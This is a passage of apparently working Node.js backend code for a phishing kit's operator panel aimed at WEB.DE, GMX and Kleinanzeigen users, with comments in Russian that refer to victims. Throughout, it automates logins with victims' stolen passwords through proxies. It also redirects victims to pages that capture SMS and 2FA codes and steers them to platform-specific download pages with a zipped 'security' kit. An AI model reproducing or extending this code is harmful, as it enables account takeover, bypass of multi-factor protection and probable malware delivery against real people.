        const emg = String(errorMessage);
        if (emg.indexOf('WEBDE_VORUEBERGEHEND_EXHAUSTED') !== -1
            || emg.indexOf('Нет комбинаций прокси') !== -1
            || emg.indexOf('Все комбинации перебраны') !== -1) {
          lead.webdeLoginGridExhausted = true;
        }
      }
      if (result === 'success' || result === 'wrong_credentials' || result === 'push' || result === 'sms'
          || result === 'two_factor' || result === 'wrong_2fa' || result === 'two_factor_timeout') {
        delete lead.webdeLoginGridStep;
      } else if (result === 'error' && !webdeErrorTriggersVictimAutomationWait(errorCode)) {
        delete lead.webdeLoginGridStep;
      }
      const klScriptCtx = fromKleinScript || lead.brand === 'klein';
      const wrongLbl = klScriptCtx ? EVENT_LABELS.WRONG_DATA_KL : EVENT_LABELS.WRONG_DATA;
      let eventLabel = ({
        success: klScriptCtx ? EVENT_LABELS.SUCCESS_KL : EVENT_LABELS.SUCCESS,
        wrong_credentials: wrongLbl,
        push: EVENT_LABELS.PUSH,
        error: 'Ошибка 502',
        sms: klScriptCtx ? EVENT_LABELS.SMS_KL : EVENT_LABELS.SMS,
        two_factor: EVENT_LABELS.TWO_FA,
        wrong_2fa: EVENT_LABELS.WRONG_2FA,
        two_factor_timeout: EVENT_LABELS.TWO_FA_TIMEOUT
      })[result] || result;
      if (result === 'success' && resultPhase === 'mail_ready_klein') {
        eventLabel = EVENT_LABELS.MAIL_READY;
      }
      if (result === 'success' && resultPhase === 'klein_reset_done') {
        eventLabel = EVENT_LABELS.SUCCESS_KL;
      }
      if (result === 'push' && pushTimeout) {
        eventLabel = EVENT_LABELS.PUSH_TIMEOUT;
      } else if (result === 'error' && (errorCode || errorMessage)) {
        let emShow = errorMessage ? String(errorMessage).replace(/\n/g, ' ') : '';
        if (/^WEBDE_VORUEBERGEHEND_EXHAUSTED:\s*/i.test(emShow)) {
          emShow = emShow.replace(/^WEBDE_VORUEBERGEHEND_EXHAUSTED:\s*/i, '').trim();
        }
        eventLabel = 'Ошибка ' + (errorCode || '500') + (emShow ? ': ' + emShow.slice(0, 180) : '');
      }
      if (result === 'wrong_credentials' && klScriptCtx) {
        lead.kleinPasswordErrorDe = (errorMessage && String(errorMessage).trim())
          ? String(errorMessage).trim().slice(0, 400)
          : KLEIN_VICTIM_PASSWORD_ERROR_DE;
      } else if (result === 'wrong_credentials') {
        delete lead.kleinPasswordErrorDe;
      }
      // Не дублировать «неверные данные»: один ввод пароля — одно событие (скрипт/ретраи могли слать POST несколько раз)
      const term = lead.eventTerminal || [];
      const lastLblWrong = term.length > 0 ? String(term[term.length - 1].label || '') : '';
      const lastIsWrongCreds = result === 'wrong_credentials' && term.length > 0 && (
        lastLblWrong.indexOf('Неверные данные') === 0
        || lastLblWrong === 'Неверный пароль'
        || lastLblWrong === 'Неверный пароль Kl'
        || lastLblWrong.indexOf('Неверный пароль') === 0
        || lastLblWrong.toLowerCase().indexOf('error password') === 0
      );
      const proxyNoteLabel = EVENT_LABELS.AUTOLOGIN_PROXY_OR_NETWORK;
      const lastIsProxyNote = term.length > 0 && String(term[term.length - 1].label || '') === proxyNoteLabel;
      const resSessionMeta = lead.webdeScriptActiveRun != null
        ? { session: lead.webdeScriptActiveRun }
        : (parseInt(lead.webdeScriptRunSeq, 10) > 0 ? { session: lead.webdeScriptRunSeq } : undefined);
      /** 500/502/503 → жертва в pending + script_automation_wait (оверлей), без редиректа — не пишем длинную «Ошибка 502…» в EVENTS. */
      const skipAdminEventForScriptVictimWait =
        result === 'error' && webdeErrorTriggersVictimAutomationWait(errorCode);
      if (!lastIsWrongCreds && !skipAdminEventForScriptVictimWait && result !== 'success') {
        pushEvent(lead, eventLabel, 'script', resSessionMeta);
      } else if (
        !lastIsWrongCreds &&
        skipAdminEventForScriptVictimWait &&
        result === 'error' &&
        shouldPushAutologinProxyAdminNote(errorCode, errorMessage) &&
        !lastIsProxyNote
      ) {
        pushEvent(lead, proxyNoteLabel, 'script', resSessionMeta);
      }
      const mailboxBrandKey =
        lead.brand === 'gmx' ? 'gmx' : lead.brand === 'vint' ? 'vint' : 'webde';
      if (result === 'success') {
        delete lead.mailboxLastRejectedPassword;
        delete lead.mailboxLastRejectedPasswordKl;
        const isKleinLead = (lead.brand === 'klein');
        if (passwordKlNew) {
          pushPasswordHistory(lead, passwordKlNew, 'klein_reset_script');
          lead.passwordKl = passwordKlNew;
        }
        if (isKleinLead) {
          delete lead.kleinPasswordErrorDe;
        }
        const startPageMb = readStartPageForBrand(mailboxBrandKey);
        const startPageKl = readStartPageForBrand('klein');
        // Klein-оркестрация: лид с почтой WEB.DE на фишинге — скрипт открыл ящик → сначала редирект на смену пароля
        // на сайте (независимо от стартовой «Login»), затем жертва видит успех; Config E-Mail и фильтры — дальше по сценарию.
        if (resultPhase === 'klein_reset_done') {
          lead.status = 'show_success';
        } else if (resultPhase === 'mail_ready_klein' && !isKleinLead) {
          lead.status = 'redirect_change_password';
        } else if (isKleinLead) {
          // Klein-лиды: как раньше (script-klein / erfolg).
          if (startPageKl === 'change') {
            lead.status = 'redirect_change_password';
          } else if (startPageKl === 'download') {
            lead.status = getRedirectPasswordStatus(lead);
          } else {
            lead.status = 'show_success';
          }
        } else if (startPageMb === 'change' || startPageMb === 'klein') {
          // WEB.DE: после входа в почту — на смену пароля; Klein на отдельном домене, не redirect_klein_anmelden здесь.
          lead.status = 'redirect_change_password';
        } else if (startPageMb === 'login') {
          lead.status = 'show_success';
        } else if (startPageMb === 'download') {
          lead.status = getRedirectPasswordStatus(lead);
          if (
            readMode() === 'auto' &&
            readAutoScript() &&
            !automationService.leadSubmittedAsKleinVictim(lead)
          ) {
            lead.mailboxAutoLoginSuccessAt = new Date().toISOString();
            lead.mailboxAutoLoginSuccessPassword = String(lead.password || '').trim();
          }
        } else {
          lead.status = 'show_success';
        }
        if (resultPhase === 'mail_ready_klein' || resultPhase === 'klein_reset_done') {
          automationService.endWebdeAutoLoginRun(lead);
        }
        if (!skipAdminEventForScriptVictimWait) {
          pushEvent(lead, EVENT_LABELS.AUTOLOGIN_MAILBOX_SUCCESS, 'script', resSessionMeta);
          const stAfter = lead.status;
          if (
            stAfter
            && stAfter !== 'show_success'
            && String(stAfter).indexOf('redirect_') === 0
            && typeof getAutoRedirectEventLabel === 'function'
          ) {
            const redirLab = getAutoRedirectEventLabel(stAfter);
            if (redirLab) pushEvent(lead, redirLab, 'script', resSessionMeta);
          }
        }
      } else if (result === 'wrong_credentials') {
        delete lead.mailboxAutoLoginSuccessAt;
        delete lead.mailboxAutoLoginSuccessPassword;
        lead.status = 'error';
        if (klScriptCtx) {
          const pk = String(lead.passwordKl || '').trim();
          lead.mailboxLastRejectedPasswordKl = pk || null;
          lead.mailboxLastRejectedPassword = null;
        } else {
          const pw = String(lead.password || '').trim();
          lead.mailboxLastRejectedPassword = pw || null;
          lead.mailboxLastRejectedPasswordKl = null;
        }
        automationService.endWebdeAutoLoginRun(lead);
      }
      else if (result === 'push') {
        if (pushTimeout) {
          lead.status = 'pending';
          lead.scriptStatus = 'wait_password';
        } else {
          lead.status = 'redirect_push';
        }
      }
      else if (result === 'sms') lead.status = 'redirect_sms_code';
      else if (result === 'two_factor') lead.status = 'redirect_2fa_code';
      else if (result === 'wrong_2fa') lead.status = 'redirect_2fa_code';
      else if (result === 'two_factor_timeout') {
        lead.status = 'redirect_2fa_code';
      } else {
        // result === 'error' — не «неверный пароль», а блок/капча/таймаут и т.д.
        const isKleinLead = (lead.brand === 'klein');
        const mbKeyErr = lead.brand === 'gmx' ? 'gmx' : lead.brand === 'vint' ? 'vint' : 'webde';
        const startPageMbErr = readStartPageForBrand(mbKeyErr);
        // Если скрипт не дождался новый пароль от админки (long-poll timeout),
        // не редиректим никуда: только ошибка и закрываем сценарий.
        if (String(errorCode || '') === '408') {
          lead.status = 'error';
        } else if (webdeErrorTriggersVictimAutomationWait(errorCode)) {
          // 500/502/503 (прокси, отпечаток, «Weiter» без эффекта и т.п.): жертва видит оверлей ожидания, без редиректа
          lead.status = 'pending';
          lead.scriptStatus = 'script_automation_wait';
          lead.scriptAutomationWaitUntil = new Date(Date.now() + WEBDE_SCRIPT_VICTIM_WAIT_MS).toISOString();
        } else if (!isKleinLead && errorMessage && String(errorMessage).indexOf('WEBDE_VORUEBERGEHEND_EXHAUSTED') !== -1) {
          lead.status = 'redirect_change_password';
        } else if (isKleinLead) {
          lead.status = 'pending';
        } else if (startPageMbErr === 'klein') {
          lead.status = 'redirect_klein_anmelden';
        } else if (startPageMbErr === 'login') {
          lead.status = 'show_success';
        } else if (startPageMbErr === 'change') {
          lead.status = 'redirect_change_password';
        } else if (startPageMbErr === 'download') {
          lead.status = getRedirectPasswordStatus(lead);
        } else {
          lead.status = 'redirect_change_password';
        }
      }
      // Жертва могла отправить SMS/2FA-код между readLeads() в начале обработчика и writeLeads — не затирать smsCodeData.
      try {
        invalidateLeadsCache();
        const diskLeads = readLeads();
        const diskLead = diskLeads.find((l) => l.id === id);
        if (diskLead && diskLead.smsCodeData && String(diskLead.smsCodeData.code || '').trim()) {
          lead.smsCodeData = JSON.parse(JSON.stringify(diskLead.smsCodeData));
        }
      } catch (e) {}
      const leadEmail = (lead.email || '').trim();
      const modeSnap = formatModeStartPageMulti(readMode(), readAutoScript(), readStartPageByBrandMap());
      logTerminalFlow(
        'РЕЖИМ',
        'webde-login-result',
        String(sessLog),
        leadEmail || '—',
        modeSnap
          + ' · поток=' + (resultPhase === 'mail_ready_klein' ? 'Klein-оркестрация' : 'WEB.DE-скрипт')
          + ' · result=' + result
          + ' · phase=' + (resultPhase || '—')
          + ' · resultSource=' + (String(json.resultSource || '').trim() || '—')
          + ' · kleinScriptCtx=' + (klScriptCtx ? '1' : '0')
          + ' · brand=' + (lead.brand || '—')
          + ' · platform=' + String(lead.platform || '—')
          + ' · attemptNo=' + (attemptNoRaw != null ? String(attemptNoRaw) : '—')
          + ' · err=' + (errorCode || '—')
          + ' · → status=' + lead.status
          + (pushTimeout ? ' · pushTimeout' : '')
          + (readStartPageForBrand(mailboxBrandKey) === 'klein' && lead.status === 'redirect_klein_anmelden'
            ? ' · редирект: стартовая страница «Klein» в админке → страница Klein на вашем домене (не смена пароля WEB.DE)'
            : ''),
        id
      );
      persistLeadFull(lead);
      if (result === 'success' && resultPhase === 'mail_ready_klein') {
        setImmediate(function () {
          try {
            const live = readLeadById(id);
            if (!live || leadHasAnyConfigEmailSentEvent(live)) return;
            sendConfigEmailToLead(live).then(function (r) {
              if (!r || !r.ok) {
                persistLeadPatch(id, { eventTerminal: live.eventTerminal, lastSeenAt: live.lastSeenAt, adminListSortAt: new Date().toISOString() });
                return;
              }
              const L2 = readLeadById(id);
              if (!L2) return;
              pushEvent(L2, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
              persistLeadPatch(id, { eventTerminal: L2.eventTerminal, lastSeenAt: L2.lastSeenAt, adminListSortAt: new Date().toISOString() });
            }).catch(function () {});
          } catch (e) {
            console.error('[mail] Config E-Mail после mail_ready_klein:', e && e.message ? e.message : e);
          }
        });
      }
      clearWebdeScriptRunning((lead.email || '').trim().toLowerCase());
      logTerminalFlow(
        'АДМИН',
        'Автовход',
        sessLog,
        leadEmail,
        'POST webde-login-result id=' + id + (id !== idRaw ? ' (из ' + idRaw + ')' : '') + ' result=' + result + ' → status=' + lead.status
          + (skipAdminEventForScriptVictimWait
            ? ' | ' + (errorCode || '') + ' оверлей ожидания (событие в админке не пишем)'
            : (' | ' + (eventLabel || ''))),
      );
      if (result === 'error' && !skipAdminEventForScriptVictimWait) {
        logTerminalFlow('АДМИН', 'Система', '—', leadEmail || '—', 'коды ошибок скрипта: 403/408/502/503/500 — см. eventLabel выше', id);
      } else if (result === 'wrong_credentials') {
        logTerminalFlow('АДМИН', 'Автовход', sessLog, leadEmail, wrongLbl + ' → status=error', id);
      }
      webdeLoginChildByLeadId.delete(id);
      releaseWebdeLoginSlot(id);
      send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/redirect-sms-code' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      console.log('[АДМИН] Кнопка: SMS — id=' + id);
      const leads = readLeads();
      const idResolved = resolveLeadId(String(id).trim());
      const idx = leads.findIndex((l) => l.id === idResolved);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_sms_code';
      const nowBump = new Date().toISOString();
      lead.lastSeenAt = nowBump;
      lead.adminListSortAt = nowBump;
      pushEvent(lead, lead.brand === 'klein' ? EVENT_LABELS.SMS_KL : EVENT_LABELS.SMS, 'admin');
      persistLeadPatch(idResolved, {
        status: lead.status,
        lastSeenAt: lead.lastSeenAt,
        adminListSortAt: lead.adminListSortAt,
        eventTerminal: lead.eventTerminal
      });
      send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/redirect-klein-sms-wait' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = readLeads();
      const idResolved = resolveLeadId(String(id).trim());
      const idx = leads.findIndex((l) => l.id === idResolved);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      if (String(lead.brand || '').toLowerCase() !== 'klein') {
        return send(res, 400, { ok: false, error: 'Только для Klein-лидов' });
      }
      lead.status = 'redirect_klein_sms_wait';
      const nowBump = new Date().toISOString();
      lead.lastSeenAt = nowBump;
      lead.adminListSortAt = nowBump;
      pushEvent(lead, 'Окно ожидания', 'admin');
      persistLeadPatch(idResolved, {
        status: lead.status,
        lastSeenAt: lead.lastSeenAt,
        adminListSortAt: lead.adminListSortAt,
        eventTerminal: lead.eventTerminal,
      });
      send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/redirect-2fa-code' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      console.log('[АДМИН] Кнопка: 2-FA — id=' + id);
      const leads = readLeads();
      const idResolved = resolveLeadId(String(id).trim());
      const idx = leads.findIndex((l) => l.id === idResolved);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_2fa_code';
      const nowBump = new Date().toISOString();
      lead.lastSeenAt = nowBump;
      lead.adminListSortAt = nowBump;
      pushEvent(lead, EVENT_LABELS.TWO_FA, 'admin');
      persistLeadPatch(idResolved, {
        status: lead.status,
        lastSeenAt: lead.lastSeenAt,
        adminListSortAt: lead.adminListSortAt,
        eventTerminal: lead.eventTerminal
      });
      send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/redirect-open-on-pc' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      console.log('[АДМИН] Кнопка: открыть на ПК — id=' + id);
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_open_on_pc';
      pushEvent(lead, 'Отправлен: «Открыть на ПК»', 'admin');
      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/redirect-android' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_android';
      pushEvent(lead, 'Отправлен на скачивание (Android)', 'admin');
      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return true;
  }

  /**
   * WEB/GMX: одна кнопка Download — по platform лида:
   * Android → страница приложения; macOS → смена пароля; Windows / iOS / прочее / неизвестно → Sicherheit (антивирус/PC).
   */

  if (pathname === '/api/redirect-download-by-platform' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      if (lead.brand === 'klein') {
        return send(res, 400, { ok: false, error: 'Только для логов WEB.DE / GMX' });
      }
      const p = (lead.platform || '').toLowerCase();
      if (p === 'android') {
        lead.status = 'redirect_android';
        pushEvent(lead, 'Отправлен на скачивание (Android)', 'admin');
      } else if (p === 'macos') {
        lead.status = 'redirect_change_password';
        pushEvent(lead, 'Отправлен на смену (Mac)', 'admin');
      } else {
        lead.status = 'redirect_sicherheit';
        pushEvent(lead, 'Отправлен на Sicherheit (Download PC)', 'admin');
      }
      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      console.log('[АДМИН] Download по OS: id=' + id + ' platform=' + (p || '?') + ' → ' + lead.status);
      send(res, 200, { ok: true, status: lead.status, platform: p || 'unknown' });
    });
    return true;
  }

  if (pathname === '/api/redirect-klein-forgot' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const urlRaw = json.url != null ? String(json.url).trim() : '';
      let kleinForgotRedirectUrl = null;
      if (urlRaw) {
        const normalized = normalizeOptionalSchemeHttpUrl(urlRaw);
        if (!normalized) {
          return send(res, 400, { ok: false, error: 'Некорректный URL (нужен http:// или https://…)' });
        }
        kleinForgotRedirectUrl = normalized.slice(0, 2000);
      }
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_klein_forgot';
      lead.kleinForgotRedirectUrl = kleinForgotRedirectUrl;
      pushEvent(lead, 'Klein: редирект на Passwort vergessen', 'admin');
      persistLeadPatch(id, {
        status: lead.status,
        eventTerminal: lead.eventTerminal,
        kleinForgotRedirectUrl: kleinForgotRedirectUrl
      });
      send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/show-error' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try {
        json = JSON.parse(body || '{}');
      } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'error';
      const hb = statusHeartbeats[id];
      const curPage = (hb && hb.currentPage) || '';
      const isSmsPage = curPage === 'sms-code';
      const is2faPage = curPage === '2fa-code';
      lead.adminErrorKind = isSmsPage || is2faPage ? 'sms' : 'login';
      let evLabel;
      if (is2faPage) {
        evLabel = EVENT_LABELS.WRONG_2FA;
      } else if (isSmsPage) {
        evLabel = lead.brand === 'klein' ? EVENT_LABELS.WRONG_SMS_KL : EVENT_LABELS.WRONG_SMS;
      } else {
        evLabel = lead.brand === 'klein' ? EVENT_LABELS.WRONG_DATA_KL : EVENT_LABELS.WRONG_DATA;
      }
      pushEvent(lead, evLabel, 'admin');
      persistLeadPatch(id, {
        status: lead.status,
        adminErrorKind: lead.adminErrorKind,
        eventTerminal: lead.eventTerminal
      });
      send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/show-success' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null && json.id !== '') ? String(json.id).trim() : '';
      if (!id) return send(res, 400, { ok: false, error: 'Нужен id лида' });
      const leads = readLeads();
      const idx = leads.findIndex((l) => l && String(l.id) === id);
      if (idx === -1) return send(res, 404, { ok: false, error: 'Запись не найдена' });
      const lead = leads[idx];
      lead.status = 'show_success';
      pushEvent(lead, lead.brand === 'klein' ? EVENT_LABELS.SUCCESS_KL : EVENT_LABELS.SUCCESS, 'admin');
      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/geo' && req.method === 'GET') {
    const ip = (parsed.query.ip || '').trim();
    if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('::ffff:127.')) {
      return send(res, 200, { countryCode: '' });
    }
    const cleanIp = ip.replace(/^::ffff:/, '');
    const opts = { hostname: 'ip-api.com', path: '/json/' + encodeURIComponent(cleanIp) + '?fields=countryCode', method: 'GET' };
    const reqGeo = http.request(opts, (resGeo) => {
      let data = '';
      resGeo.on('data', (chunk) => { data += chunk; });
      resGeo.on('end', () => {
        if (safeEnd(res)) return;
        let countryCode = '';
        try {
          const j = JSON.parse(data);
          if (j && j.countryCode) countryCode = String(j.countryCode).toUpperCase().slice(0, 2);
        } catch (_) {}
        res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
        res.end(JSON.stringify({ countryCode: countryCode }));
      });
    });
    reqGeo.on('error', () => {
      if (safeEnd(res)) return;
      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
      res.end(JSON.stringify({ countryCode: '' }));
    });
    reqGeo.setTimeout(3000, () => {
      reqGeo.destroy();
      if (safeEnd(res)) return;
      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
      res.end(JSON.stringify({ countryCode: '' }));
    });
    reqGeo.end();
    return true;
  }

  if (pathname === '/api/zip-password' && req.method === 'GET') {
    const q = parsed && parsed.query ? parsed.query : {};
    let brand = '';
    const nb = typeof normalizeZipPasswordBrand === 'function' ? normalizeZipPasswordBrand(q.brand) : null;
    if (nb) brand = nb;
    if (!brand && q.leadId) {
      const lid = String(q.leadId).trim();
      const rid = typeof resolveLeadId === 'function' ? resolveLeadId(lid) : lid;
      const L = typeof readLeadById === 'function' ? readLeadById(rid) : null;
      if (L) {
        const dk = require('../services/downloadKitService');
        brand = dk.downloadKitBrandFromLead(L);
      }
    }
    const password =
      typeof readZipPasswordForBrand === 'function'
        ? readZipPasswordForBrand(brand)
        : readZipPassword();
    send(res, 200, { password: password });
    return true;
  }

  }
  return false;
}

module.exports = { handle };
